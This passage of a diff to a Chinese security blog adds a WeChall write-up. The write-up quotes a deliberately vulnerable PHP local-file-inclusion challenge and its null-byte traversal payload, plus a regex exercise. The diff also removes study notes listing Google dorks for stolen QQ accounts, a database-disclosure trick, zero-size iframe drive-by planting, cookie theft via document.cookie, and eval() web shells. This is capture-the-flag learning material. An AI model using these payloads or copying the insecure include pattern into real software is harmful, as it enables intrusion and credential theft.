class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># Higlighter Plain 如果有show变量，且show变量的值是source，就显示index.php的代码</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>] === <span class="string">&#x27;source&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">        header(<span class="string">&#x27;Content-Type: text/plain; charset=utf8;&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Change dir to web root 跳转到这个目录</span></span><br><span class="line">chdir(<span class="string">&#x27;../../../../../&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Print the website header</span></span><br><span class="line">define(<span class="string">&#x27;GWF_PAGE_TITLE&#x27;</span>, <span class="string">&#x27;Local File Inclusion&#x27;</span>);</span><br><span class="line"><span class="comment"># 与require作用相同，唯一区别是若该文件代码已被包含，则不会再次包含</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;challenge/html_head.php&#x27;</span>);</span><br><span class="line"><span class="comment"># ？</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">false</span> === (<span class="variable">$chall</span> = WC_Challenge::getByTitle(<span class="string">&#x27;Training: PHP LFI&#x27;</span>))) &#123;</span><br><span class="line">        <span class="variable">$chall</span> = WC_Challenge::dummyChallenge(<span class="string">&#x27;Training: PHP LFI&#x27;</span>, <span class="number">2</span>, <span class="string">&#x27;challenge/training/php/lfi/up/index.php&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$chall</span>-&gt;showHeader();</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># Highlighter BBCode</span></span><br><span class="line"><span class="comment"># 从URL处判断是否是高亮显示代码</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;highlight&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;highlight&#x27;</span>] === <span class="string">&#x27;christmas&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">echo</span> GWF_Message::display(<span class="string">&#x27;[PHP]&#x27;</span>.file_get_contents(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>]).<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        <span class="keyword">require_once</span>(<span class="string">&#x27;challenge/html_foot.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">###############################</span></span><br><span class="line"><span class="comment">### Here is your exploit :) ###</span></span><br><span class="line"><span class="comment">###############################</span></span><br><span class="line"><span class="comment"># 此处为关键语句，code为设置filename=pages/&#123;&#125;.html，如果有file变量，则填入file变量，否则填入welcom</span></span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;$filename = \&#x27;pages/\&#x27;.(isset($_GET[&quot;file&quot;])?$_GET[&quot;file&quot;]:&quot;welcome&quot;).\&#x27;.html\&#x27;;&#x27;</span>;</span><br><span class="line"><span class="variable">$code_emulate_pnb</span> = <span class="string">&#x27;$filename = Common::substrUntil($filename, &quot;\\0&quot;);&#x27;</span>; <span class="comment"># Emulate Poison Null Byte for PHP&gt;=5.3.4</span></span><br><span class="line"><span class="comment"># 包含filename文件</span></span><br><span class="line"><span class="variable">$code2</span> = <span class="string">&#x27;include $filename;&#x27;</span>;</span><br><span class="line"><span class="comment">### End of exploit ###</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># Show the mission box</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;index.php?file=&#x27;</span>;</span><br><span class="line"><span class="variable">$ex</span> = <span class="keyword">array</span>(<span class="string">&#x27;welcome&#x27;</span>, <span class="string">&#x27;news&#x27;</span>, <span class="string">&#x27;forums&#x27;</span>);</span><br><span class="line"><span class="variable">$showsrc1</span> = <span class="string">&#x27;index.php?show=source&#x27;</span>;</span><br><span class="line"><span class="variable">$showsrc2</span> = <span class="string">&#x27;index.php?highlight=christmas&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$ex</span> <span class="keyword">as</span> <span class="variable">$i</span> =&gt; <span class="variable">$e</span>) &#123; <span class="variable">$ex</span>[<span class="variable">$i</span>] = htmlspecialchars(<span class="variable">$url</span>.<span class="variable">$e</span>); &#125;</span><br><span class="line"><span class="keyword">echo</span> GWF_Box::box(<span class="variable">$chall</span>-&gt;lang(<span class="string">&#x27;info&#x27;</span>, <span class="keyword">array</span>(GWF_Message::display(<span class="string">&#x27;[PHP]&#x27;</span>.<span class="variable">$code</span>.PHP_EOL.<span class="variable">$code2</span>.<span class="string">&#x27;&#x27;</span>), <span class="string">&#x27;../solution.php&#x27;</span>, <span class="variable">$showsrc1</span>, <span class="variable">$showsrc2</span>, <span class="variable">$ex</span>[<span class="number">0</span>], <span class="variable">$ex</span>[<span class="number">1</span>], <span class="variable">$ex</span>[<span class="number">2</span>])), <span class="variable">$chall</span>-&gt;lang(<span class="string">&#x27;title&#x27;</span>));</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Execute the code, using eval.</span></span><br><span class="line">GWF_Debug::setDieOnError(<span class="literal">false</span>);</span><br><span class="line">GWF_Debug::setMailOnError(<span class="literal">false</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$code</span>.<span class="variable">$code_emulate_pnb</span>); <span class="comment"># eval the first line</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;box&quot;&gt;&#x27;</span>.PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;box_t&quot;&gt;&#x27;</span>.<span class="variable">$chall</span>-&gt;lang(<span class="string">&#x27;example_title&#x27;</span>).<span class="string">&#x27; (&#x27;</span>.htmlspecialchars(<span class="variable">$filename</span>).<span class="string">&#x27;)&#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>.PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;div class=&quot;box_c&quot;&gt;&#x27;</span>.PHP_EOL;</span><br><span class="line"><span class="keyword">if</span> (lfiIsSafeDir(<span class="variable">$filename</span>) === <span class="literal">true</span>) &#123; <span class="keyword">eval</span>(<span class="variable">$code2</span>); &#125; <span class="comment"># Eval the second line, when safe.</span></span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> GWF_HTML::error(<span class="string">&#x27;LFI&#x27;</span>, <span class="variable">$chall</span>-&gt;lang(<span class="string">&#x27;err_basedir&#x27;</span>), <span class="literal">false</span>); &#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/div&gt;&#x27;</span>.PHP_EOL;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/div&gt;&#x27;</span>.PHP_EOL;</span><br><span class="line">GWF_Debug::setMailOnError(<span class="literal">true</span>);</span><br><span class="line">GWF_Debug::setDieOnError(<span class="literal">true</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Show credits box</span></span><br><span class="line"><span class="keyword">if</span> (<span class="literal">false</span> !== (<span class="variable">$minus</span> = GWF_User::getByName(<span class="string">&#x27;minus&#x27;</span>)))</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">echo</span> GWF_Box::box(<span class="variable">$chall</span>-&gt;lang(<span class="string">&#x27;credits&#x27;</span>, <span class="keyword">array</span>(<span class="variable">$minus</span>-&gt;displayProfileLink())));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># Show end of website</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$chall</span>-&gt;copyrightFooter();</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;challenge/html_foot.php&#x27;</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">### Safety first ###</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lfiIsSafeDir</span>(<span class="params"><span class="variable">$filename</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="variable">$valid</span> = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;pages&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;pages/../..&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;pages/..&#x27;</span>,</span><br><span class="line">        );</span><br><span class="line">        <span class="variable">$d</span> = dirname(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> in_array(<span class="variable">$d</span>, <span class="variable">$valid</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>根据代码中的关键代码段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 此处为关键语句，code为设置filename&#x3D;pages&#x2F;&#123;&#125;.html，如果有file变量，则填入file变量，否则填入welcom</span><br><span class="line">$code &#x3D; &#39;$filename &#x3D; \&#39;pages&#x2F;\&#39;.(isset($_GET[&quot;file&quot;])?$_GET[&quot;file&quot;]:&quot;welcome&quot;).\&#39;.html\&#39;;&#39;;</span><br><span class="line">$code_emulate_pnb &#x3D; &#39;$filename &#x3D; Common::substrUntil($filename, &quot;\\0&quot;);&#39;; # Emulate Poison Null Byte for PHP&gt;&#x3D;5.3.4</span><br><span class="line"># 包含filename文件</span><br><span class="line">$code2 &#x3D; &#39;include $filename;&#39;;</span><br></pre></td></tr></table></figure>
+<p>提交URL（为什么两个父节点，因为试出来的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;..&#x2F;..&#x2F;solution.php%00 </span><br><span class="line"># %00用于截断</span><br></pre></td></tr></table></figure>
+<h1 id="Training-Regex-2"><a href="#Training-Regex-2" class="headerlink" title="Training: Regex"></a>Training: Regex</h1><p>考察：正则</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;^(wechall4?)\.(?:jpg|gif|tiff|bmp|png)$&#x2F;</span><br></pre></td></tr></table></figure>
+<p>至于为什么用:，是因为题目提示了“你的模式会补货一个字符串，但这不是必须的。请使用非捕获组”</p>
+<h2 id="正则的非获取匹配"><a href="#正则的非获取匹配" class="headerlink" title="正则的非获取匹配"></a>正则的非获取匹配</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?:pattern</span><br><span class="line">	匹配pattern但不获取匹配结果，不进行存储供使用</span><br></pre></td></tr></table></figure>
+<p>参考 <a target="_blank" rel="noopener" href="http://qinxuye.me/article/non-capturing-pattern-in-regular-expression/">http://qinxuye.me/article/non-capturing-pattern-in-regular-expression/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; re.match(&quot;win (7|vista)&quot;, &quot;win 7&quot;).group()</span><br><span class="line">&#39;win 7&#39;</span><br><span class="line"> </span><br><span class="line">&gt;&gt;&gt; re.match(&quot;win (7|vista)&quot;, &quot;win 7&quot;).groups()</span><br><span class="line">(&#39;7&#39;,)</span><br><span class="line"> </span><br><span class="line">&gt;&gt;&gt; re.match(&quot;win (?:7|vista)&quot;, &quot;win 7&quot;).group()</span><br><span class="line">&#39;win 7&#39;</span><br><span class="line"> </span><br><span class="line">&gt;&gt;&gt; re.match(&quot;win (?:7|vista)&quot;, &quot;win 7&quot;).groups()</span><br><span class="line">()</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -1701,107 +1870,6 @@
 
 
   
-    <article id="post-精通黑客脚本笔记" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/12/23/%E7%B2%BE%E9%80%9A%E9%BB%91%E5%AE%A2%E8%84%9A%E6%9C%AC%E7%AC%94%E8%AE%B0/" class="article-date">
-  <time class="dt-published" datetime="2020-12-23T12:56:36.000Z" itemprop="datePublished">2020-12-23</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/12/23/%E7%B2%BE%E9%80%9A%E9%BB%91%E5%AE%A2%E8%84%9A%E6%9C%AC%E7%AC%94%E8%AE%B0/">精通黑客脚本笔记</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h2 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h2><h1 id="第二章-常见脚本漏洞演练"><a href="#第二章-常见脚本漏洞演练" class="headerlink" title="第二章 常见脚本漏洞演练"></a>第二章 常见脚本漏洞演练</h1><h2 id="Google-Hack技术大演练"><a href="#Google-Hack技术大演练" class="headerlink" title="Google Hack技术大演练"></a>Google Hack技术大演练</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">intitle:管理登录 filetype:php # 搜索存在敏感信息的网站</span><br><span class="line">payment site:fr # 法国的相关支付界面</span><br><span class="line">inurl:qq.txt # 搜索被盗的qq号</span><br><span class="line">site:baidu.com # 搜索子域名</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h2 id="暴库漏洞攻击"><a href="#暴库漏洞攻击" class="headerlink" title="暴库漏洞攻击"></a>暴库漏洞攻击</h2><p>conn.asp是数据库连接文件，包含了被调用数据库的路径及数据库名</p>
-<p>conn.asp暴库原理为，直接访问conn.asp时，相对路径出错</p>
-<p>/改成%5c。%5c在16进制中为\。当IIS遇到\，IIS以为遇到了一个虚拟目录，便停止解析，从而报错</p>
-<h1 id="第三章-HTML语言入门"><a href="#第三章-HTML语言入门" class="headerlink" title="第三章 HTML语言入门"></a>第三章 HTML语言入门</h1><h2 id="自定义头像跨站漏洞"><a href="#自定义头像跨站漏洞" class="headerlink" title="自定义头像跨站漏洞"></a>自定义头像跨站漏洞</h2><p>若写入跨站代码后，返回数据上出现字符，则存在跨站漏洞。只需要将HTML中标签闭合即可。</p>
-<h2 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h2><p>隐藏域页面中不饿建，通常用来收集或发送信息</p>
-<h2 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h2><frameset>不能放在<body>或<head>标签中
-
-<p>动态框架<iframe>可以实现在网页内部嵌入网页，但是其中的src属性也带来了挂马风险。挂马时，把该标签的高度、宽度、frameborder设置为0</p>
-<h1 id="第四章-Javascript和Vbscript入门"><a href="#第四章-Javascript和Vbscript入门" class="headerlink" title="第四章 Javascript和Vbscript入门"></a>第四章 Javascript和Vbscript入门</h1><p>通过Javascript程序，可以控制web页面的外观，也能够检测用户数据的有效性，而这些操作都不需要和服务器进行交互，这样就减轻了服务器的处理数据负担。</p>
-<p>事件是Javascript让页面活起来的驱动力，所有的Javascript都是对某个事件做出的操作和反应</p>
-<h2 id="Javascript基础"><a href="#Javascript基础" class="headerlink" title="Javascript基础"></a>Javascript基础</h2><p>document.writeln()在添加<pre>标签后，才会有换行作用。</p>
-<p>三种交互方法：alert()，confirm()，prompt()</p>
-<p>变量区分大小写</p>
-<p>BOM，browser object model，浏览器对象模型</p>
-<p>通过Javascript内置对象navigator我么可以知道当前使用的浏览器是那种类型，那种版本，是否支持java，当前浏览器插件信息等</p>
-<p>window对象在使用时，允许省略。如window.alert省略为alert</p>
-<p>DOM，document object model，文档对象模型</p>
-<p>document.cookie可以获取cookie，用于窃取cookie</p>
-<h2 id="VBScript基础"><a href="#VBScript基础" class="headerlink" title="VBScript基础"></a>VBScript基础</h2><p>VBScript只有一种数据类型Variant</p>
-<p>为了不影响程序运行效率和养成良好变成习惯，先声明变量再赋值。使用dim</p>
-<h2 id="使用cookie"><a href="#使用cookie" class="headerlink" title="使用cookie"></a>使用cookie</h2><p>通过document.cookie进行设置并取用</p>
-<p>HTTP Set-Cookie头的格式为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie:name&#x3D;value;[expires&#x3D;date];[path&#x3D;pathname];[domain&#x3D;domainname];[secure];</span><br><span class="line">方括号为可以省略的部分</span><br></pre></td></tr></table></figure>
-<p>设置cookie的格式为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie&#x3D;encodeURI(&quot;name&quot;)+&quot;&#x3D;&quot;+encodeURI(name)+&quot;;&quot;</span><br></pre></td></tr></table></figure>
-<p>escape和encodeURI都可以用来对字符进行编码。escape将非字母字符转换为用字符和数字表示的等价字符串；encodeURI类似。</p>
-<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><h3 id="正则表达式对象方法"><a href="#正则表达式对象方法" class="headerlink" title="正则表达式对象方法"></a>正则表达式对象方法</h3><h4 id="test"><a href="#test" class="headerlink" title="test()"></a>test()</h4><p>lastIndex属性返回下一次字符串搜索开始的位置。若为全局搜索，返回最后一个匹配的字符串后面一个字符的位置</p>
-<h4 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h4><p>lastIndex属性返回前一次匹配字符串的第一个字符的位置</p>
-<h3 id="正则表达式的字符串对象的方法"><a href="#正则表达式的字符串对象的方法" class="headerlink" title="正则表达式的字符串对象的方法"></a>正则表达式的字符串对象的方法</h3><p>match,</p>
-<h2 id="跨站攻击"><a href="#跨站攻击" class="headerlink" title="跨站攻击"></a>跨站攻击</h2><p>UBB，Ultimate Bulletin Board，一种tag语法代码</p>
-<p>① 过滤用户提交变量中的&lt;和&gt;，从而防止用户自行构造html标记</p>
-<p>② 过滤其中的：代码，从而防止javascript和vbscript的执行</p>
-<p>③ 过滤或转换空格字符</p>
-<h1 id="第五章-数据库基础"><a href="#第五章-数据库基础" class="headerlink" title="第五章 数据库基础"></a>第五章 数据库基础</h1><h2 id="利用SQL进行数据查询"><a href="#利用SQL进行数据查询" class="headerlink" title="利用SQL进行数据查询"></a>利用SQL进行数据查询</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE tablename (field type[(size)][NOT NULL]&#123;, field type [(size)][NOT NULL]&#125;[, PRIMARY KEY(field&#123;,field...&#125;)]);</span><br><span class="line">SELECT[ALL|DISTINCT]&#123;expr[[AS]c_alias&#123;,expr[[AS]c_alias]...&#125;&#125; from tableref&#123;,tableref...&#125; [where&lt;search_condition]</span><br><span class="line">SELECT DISTINCT id FROM hack</span><br><span class="line">SELECT id AS 标识, name AS 姓名, city AS 城市, age AS 年龄 FROM hack</span><br><span class="line">SELECT * FROM hack GROUP BY age</span><br><span class="line">SELECT * FROM hack WHERE city&#x3D;(SELECT city FROM hack WHERE id&#x3D;100)</span><br></pre></td></tr></table></figure>
-<p>集合函数</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">COUNT(column_name) 统计column_name列非空的元组数目</span><br><span class="line">SUM(column_name) 统计column_name列的值的和</span><br><span class="line">AVG(column_name)</span><br><span class="line">MAX(column_name)</span><br><span class="line">MIN(column_name)</span><br></pre></td></tr></table></figure>
-<p>子查询结果是集合时，谓语关键词可以使用IN，ANY/ALL，EXISTS</p>
-<h1 id="第六章-ASP基础"><a href="#第六章-ASP基础" class="headerlink" title="第六章 ASP基础"></a>第六章 ASP基础</h1><h2 id="ASP常用内置对象"><a href="#ASP常用内置对象" class="headerlink" title="ASP常用内置对象"></a>ASP常用内置对象</h2><h3 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h3><p>用于得到用户提交的数据</p>
-<p>用querystring获取GET，用form获取POST</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">myname&#x3D;request.querystring(&quot;name&quot;) #GET方式</span><br><span class="line">myname&#x3D;request.form(&quot;name&quot;) #POST方式</span><br></pre></td></tr></table></figure>
-<h3 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h3><p>将服务器数据发送到用户的浏览器上</p>
-<p>write方法，将数据输出到客户端</p>
-<p>redirect方法，重定向，需要设置Response对象的Buffer属性为真</p>
-<p>Status属性，HTTP响应的状态码</p>
-<h3 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h3><p>扩展asp功能，可以利用符合COM接口的第三方组件</p>
-<p>CreateObject()方法，利用符合COM接口的第三方组件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set myVar &#x3D; Server.CreateObject(&quot;ADODB.connection&quot;)</span><br></pre></td></tr></table></figure>
-<p>HTMLEncode()方法，用于字符串编码，可防止跨站漏洞</p>
-<p>URLEncode()方法，字符串以URL的编码输出</p>
-<h3 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h3><p>存储特定用户会话所需的信息</p>
-<h2 id="ASP组件"><a href="#ASP组件" class="headerlink" title="ASP组件"></a>ASP组件</h2><p>即ActiveX</p>
-<h2 id="ADO"><a href="#ADO" class="headerlink" title="ADO"></a>ADO</h2><p>ActiveX Data Objects，ActiveX数据对象</p>
-<h1 id="第九章-PHP基础"><a href="#第九章-PHP基础" class="headerlink" title="第九章 PHP基础"></a>第九章 PHP基础</h1><h2 id="快速入门"><a href="#快速入门" class="headerlink" title="快速入门"></a>快速入门</h2><p>一个PHP文件由五个部分组成：HTML、PHP标记、PHP语句、空格、注释</p>
-<h3 id="PHP标记风格"><a href="#PHP标记风格" class="headerlink" title="PHP标记风格"></a>PHP标记风格</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo &#39;内容&#39;; ?&gt;</span><br><span class="line">#XML风格</span><br><span class="line">&lt;? echo &#39;内容&#39;; ?&gt; </span><br><span class="line">#简短风格，需要在php.ini中启用short_open_tag，且是默认启用</span><br><span class="line">&lt;SCRIPT LANGUAGE&#x3D;&#39;php&#39;&gt;echo &#39;内容&#39;;&lt;&#x2F;SCRIPT&gt; </span><br><span class="line">#SCRIPT风格</span><br><span class="line">&lt;% echo &#39;内容&#39; %&gt; </span><br><span class="line"># ASP风格，需要启用asp_tags，默认不启用</span><br></pre></td></tr></table></figure>
-<h3 id="访问表单变量"><a href="#访问表单变量" class="headerlink" title="访问表单变量"></a>访问表单变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$display # 需要开启register_globals，默认不开启</span><br><span class="line">$_POST[&#39;display&#39;] # 默认</span><br><span class="line">$HTTP_POST_VARS[&#39;display&#39;] # 弃用 </span><br></pre></td></tr></table></figure>
-<h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$GLOBALS、$_SERVER、$_GET、$_POST、$_COOKIE、$_FILES、$_ENV、$_REQUEST、$_SESSION</span><br></pre></td></tr></table></figure>
-<h2 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">trim() # 去除空格</span><br><span class="line">addslshes() # 转移字符</span><br><span class="line">stripslashes() # 与addslshes功能相反</span><br><span class="line">php.ini中的magic_quotes_gpc配置指令 # 若为TRUE，则会实现addslshes和stripslashes</span><br></pre></td></tr></table></figure>
-<h2 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$db &#x3D; new mysqli(&#39;主机名&#39;，&#39;MYSQL用户名&#39;, &#39;MYSQL密码&#39;,&#39;需要访问的数据库&#39;)</span><br><span class="line">$db &#x3D; mysqli_connect(&#39;主机名&#39;，&#39;MYSQL用户名&#39;, &#39;MYSQL密码&#39;,&#39;需要访问的数据库&#39;)</span><br><span class="line"></span><br><span class="line">$result &#x3D; mysql_query(&quot;select * from hack&quot;)</span><br><span class="line">$result &#x3D; mysql_db_query(&quot;crack&quot;,&quot;select * from hack&quot;)</span><br></pre></td></tr></table></figure>
-<h2 id="高级功能"><a href="#高级功能" class="headerlink" title="高级功能"></a>高级功能</h2><h3 id="与文件系统和服务器交互"><a href="#与文件系统和服务器交互" class="headerlink" title="与文件系统和服务器交互"></a>与文件系统和服务器交互</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#上传</span><br><span class="line">在超级全局数组$_FILES中处理（需要register_global开启）</span><br><span class="line"></span><br><span class="line">#目录文件</span><br><span class="line">opendir()</span><br><span class="line">readdir()</span><br><span class="line">closedir()</span><br><span class="line">mkdir()</span><br><span class="line">basename(),dirname()</span><br><span class="line">rmdir()</span><br><span class="line">copy()</span><br><span class="line">rename()</span><br><span class="line"></span><br><span class="line">#程序执行函数</span><br><span class="line">exec(string command[,array &amp;result[,int &amp;result_value]]) # 只返回命令结果的最后一行，若以result传递变量，将获得返回字符串数组；若result_value传递变量，将获得返回代码</span><br><span class="line">passthru() #将结果直接输出并显示在浏览器</span><br><span class="line">system() #将结果直接输出并显示在浏览器</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h3 id="会话控制"><a href="#会话控制" class="headerlink" title="会话控制"></a>会话控制</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setcookie()</span><br><span class="line">session_get_cookie_params()</span><br></pre></td></tr></table></figure>
-<h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval()</span><br></pre></td></tr></table></figure>
-<h1 id="第十章-PHP程序常见问题"><a href="#第十章-PHP程序常见问题" class="headerlink" title="第十章 PHP程序常见问题"></a>第十章 PHP程序常见问题</h1><h2 id="PHP注射漏洞"><a href="#PHP注射漏洞" class="headerlink" title="PHP注射漏洞"></a>PHP注射漏洞</h2><p>intval() 将所有数据强制转换为数字</p>
-
-      
-    </div>
-    <footer class="article-footer">
